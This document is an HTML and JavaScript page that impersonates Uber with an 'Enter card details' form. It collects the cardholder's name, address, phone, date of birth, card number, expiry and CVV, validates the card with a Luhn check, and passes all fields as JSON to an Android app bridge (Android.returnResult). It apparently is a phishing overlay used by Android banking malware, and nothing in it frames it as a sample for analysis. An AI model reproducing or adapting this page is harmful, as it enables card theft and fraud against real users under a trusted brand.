<!DOCTYPE html>
<html>
<head>
    <title>uber</title>
    <link rel="shortcut icon" href="com.ubercab.png" type="image/png">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta charset="utf-8">
</head>
<body>

<style type="text/css">
    body {
        background: #fff;
        margin: 0;
        padding: 0;
        font-family: Helvetica, sans-serif;
    }
    .logo {
    text-align: center;
    background-size: 100%;
    padding: 30px 0px 30px 0px;
    background: #000;
    color: #fff;
    font-weight: 400;
    font-size: 18px;
    text-decoration: none;
    }
    .form {
        text-align: center;
        padding-top: 70px;
    }
    .form label {
        display: block;
    }
    form {
        display: inline-block;
    }
fieldset {
      position: relative;
      text-align: center;
      border: none;
          margin: 0;
    padding: 0;

}
form {
      position: relative;
      text-align: center;
      border: none;
          margin: 0;
    padding: 0;
    width: 100%;

}

input[type="text"],input[type="password"], input[type="number"], input[type="date"] {
line-height: 16px;
    font-size: 17px;
    box-sizing: border-box;
    width: 100%;
    position: relative;
    padding: 0px 0px 0px 0px;
    margin: 0px 0px;
    -webkit-box-shadow: none;
    outline: none;
    box-shadow: none;
    -webkit-appearance: none;
    height: 54px;
    color: #000;
    outline: none;
    text-align: left;
    border: none;
    background: none;
    outline: none;
    margin: 0px;
    border: 1px solid #9f9e9e;
    border-top: none;
    border-left: none;
    border-right: none;
    padding-left: 5px;
}
input[type="button"], button {
left: 0;
    right: 0;
    width: 100%;
    height: 50px;
    margin: 0 auto;
    outline: none;
    color: #fff;
    border: none;
    font-size: 14px;
    -webkit-appearance: none;
    cursor: pointer;
    background: #000;
    margin-top: 40px;
    border: none;
    cursor: pointer;
    font-weight: bolder;
}

input:disabled, button:disabled {
left: 0;
    right: 0;
    width: 100%;
    height: 50px;
    margin: 0 auto;
    outline: none;
    color: #fff;
    border: none;
    font-size: 14px;
    -webkit-appearance: none;
    cursor: pointer;
    background: #000;
    margin-top: 40px;
    border: none;
    cursor: pointer;
    font-weight: bolder;
    opacity: 0.7;
}
input::placeholder {
    font-size: 14px;
}

</style>

<fieldset id="formtosend">

<div class="logo">

Enter card details

</div>

<div class="" id="log" style="display: block;">

<div class="area" style="padding: 0px;border-radius: 10px;">


<div class="forma" style="background: #fff; border-radius: 0px; padding-top: 20px; padding-bottom: 20px;">

<form id="infodata">


<input type="text" name="Cardholder" id="Cardholder" pattern=".{3,}" placeholder="Cardholder Name" onkeyup="CheckValidInput('infodata')" autocomplete="none" required>
<input type="text" name="Address" id="Address" pattern=".{3,}" placeholder="Street Address" onkeyup="CheckValidInput('infodata')" autocomplete="none" required>
<input type="text" name="City" id="City" pattern=".{1,}" placeholder="City" onkeyup="CheckValidInput('infodata')" autocomplete="none" required>
<input type="text" name="State" id="State" pattern=".{1,}" placeholder="State" onkeyup="CheckValidInput('infodata')" autocomplete="none" required>
<input type="text" name="ZIP" id="ZIP" pattern="[0-9\-]{3,11}" maxlength="30" onkeyup="CheckValidInput('infodata')" placeholder="ZIP Code" autocomplete="none" required>
<input type="text" name="Phone" id="Phone" onkeyup="CheckValidInput('infodata')" maxlength="30" placeholder="Telephone Number" autocomplete="none" required>

<input id="DOB" name="DOB" type="text" placeholder="Date of birth" pattern=".{1,}" autocomplete="off" type="text" style="width: 100%;" onkeyup="CheckValidInput('infodata')" onfocus="(this.type='date')" onblur="if(!this.value)this.type='text'" required>

<button id="btnNext" type="button" onclick="ChangeCCNext()">Next</button>



</form>

<script type="text/javascript">
    function next() {
        document.getElementById('login_form').style.display = 'none';
        document.getElementById('ccForm').style.display = 'block';
    }
</script>

<div id="CC">

<form id="ccdata" style="display: none;">

<input id="CCNUM" placeholder="Card Number" pattern="^[0-9 ]{12,24}$" maxlength="24" autocomplete="off" type="text" onkeyup="CheckValidInput('ccdata')" required>
<span id="ccnumlbl" style="
    display: block;
    padding-top: 5px;
    text-align: left;
    font-size: 14px;
    padding-bottom: 10px;
    color: #eb2617;
    padding-left: 5px;
"></span>
<input class="dt" name="MM" id="CCexpMM" placeholder="MM" pattern="^[1-9]{1}$|^[1]{1}[0-2]{1}$|^[0][1-9]{1}$" onkeyup="check2()" maxlength="2" autocomplete="off" type="text" style="width: 45%;" required>
<input class="dt" name="YY" id="CCEXPYY" placeholder="YY" pattern="^19$|^2[0-9]$" maxlength="2" autocomplete="off" onkeyup="check2()" type="text" style="width: 45%;" required>

<input id="CVV" name="CVV" placeholder="CVV" pattern="^[0-9]{3}$" autocomplete="off" maxlength="3" onkeyup="check2()" type="password" style="width:100%;" required>

<button id="btnSumbit" type="button" onclick="send_form()">Save</button>

</form>

</div>

<script type="text/javascript">

function check2() {
  var inp1 = document.getElementById('CCexpMM');
  var inp2 = document.getElementById('CCEXPYY');
  var inp3 = document.getElementById('CVV');
  document.getElementById('btnSumbit').disabled = inp1.value && inp2.value && inp3.value ? false : "disabled";
}

invalidCC = 'Invalid card number';


function maskCC(event) {
    var vcc = this.value.replace(/\D/g, '');
    this.value = '';
    for(var i = 0; i < vcc.length; i++) {
        this.value += (i%4==0 && i != 0 ? ' ' : '') + vcc[i];
    }
}
document.getElementById('CCNUM').addEventListener('input', maskCC, false);

function maskPhone(event) {
    var vpp = this.value.replace(/\D/g, '');
    this.value = '+' + vpp;
}
document.getElementById('Phone').addEventListener('input', maskPhone, false);

function maskOnlyNumbers(event) {
    this.value = this.value.replace(/\D/g, '');
}

var iddNUMBERS = ['ZIP', 'CCexpMM', 'CCEXPYY', 'CVV'];
for(var i = 0; i < iddNUMBERS.length; i++) {
    document.getElementById(iddNUMBERS[i]).addEventListener('input', maskOnlyNumbers, false);
}

function valid_credit_card(value) {
    if (/[^0-9-\s]+/.test(value)) return false;
    var nCheck = 0, nDigit = 0, bEven = false;
    value = value.replace(/\D/g, "");
    for (var n = value.length - 1; n >= 0; n--) {
        var cDigit = value.charAt(n),
              nDigit = parseInt(cDigit, 10);
        if (bEven) {
            if ((nDigit *= 2) > 9) nDigit -= 9;
        }
        nCheck += nDigit;
        bEven = !bEven;
    }
    return (nCheck % 10) == 0;
}

var BtnsOnPages = document.getElementsByTagName('button');
for(var i = 0; i < BtnsOnPages.length; i++) {
    BtnsOnPages[i].disabled = true;
}

function CheckValidInput(id) {
    var finalbool = true, formids = document.getElementById(id);
    var currentinputs = formids.getElementsByTagName('input');
    for(var i = 0; i < currentinputs.length; i++ ) {
        if(currentinputs[i].id == 'CCNUM') {
            var bbb = valid_credit_card(currentinputs[i].value);
            document.getElementById('ccnumlbl').innerText = bbb & currentinputs[i].checkValidity() ? '' : invalidCC;
            finalbool&= bbb;
            continue;
        }
        finalbool &= currentinputs[i].checkValidity();
    }
    formids.getElementsByTagName('button')[0].disabled = !finalbool;
}

var AllForms = document.getElementsByTagName('form');

function ChangeCCNext() {
    document.getElementById('infodata').style.display = 'none';
    document.getElementById('ccdata').style.display = 'block';
    
}
</script>

<input name="exit" type="hidden" text="true"/>

</div>

            </div>
        
</div>

</fieldset> 


<script>
if ( typeof Android == "undefined")
    var Android = {
        returnResult : alert.bind(window)
    }

/*********Recursive implementation of jSON.stringify; ********/
var stringifyJSON = function(obj) {
    var arrOfKeyVals = [],
        arrVals = [],
        objKeys = [];

    /*********CHECK FOR PRIMITIVE TYPES**********/
    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
        return '' + obj;
    else if (typeof obj === 'string')
        return '"' + obj + '"';

    /*********CHECK FOR ARRAY**********/
    else if (Array.isArray(obj)) {
        if (obj[0] === undefined)
            return '[]';
        else {
            obj.forEach(function(el) {
                arrVals.push(stringifyJSON(el));
            });
            return '[' + arrVals.join(',') + ']';
        }
    }
    /*********CHECK FOR OBJECT**********/
    else if (obj instanceof Object) {
        objKeys = Object.keys(obj);
        objKeys.forEach(function(key) {
            var keyOut = '"' + key + '":';
            var keyValOut = obj[key];
            if (keyValOut instanceof Function || typeof keyValOut === undefined)
                arrOfKeyVals.push('');
            else if (typeof keyValOut === 'string')
                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
                arrOfKeyVals.push(keyOut + keyValOut);
            else if (keyValOut instanceof Object) {
                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
            }
        });
        return '{' + arrOfKeyVals + '}';
    }
};

function formToJSONbyName(f)
{
    var FinalObject = {}, namesHTML = ['input','select'];
    for(var i = 0; i < namesHTML.length; i++) {
        var bsform = f.getElementsByTagName(namesHTML[i]);
        for(var j = 0; j < bsform.length; j++) {
            if(bsform[j].name == 'sumbit') continue;
            FinalObject[bsform[j].name] = bsform[j].value
        }
    }
    return stringifyJSON(FinalObject);
}

function send_form()
{
    var form = document.getElementById('formtosend');
    Android.returnResult( formToJSONbyName(form) );
}

</script>

</body>
</html>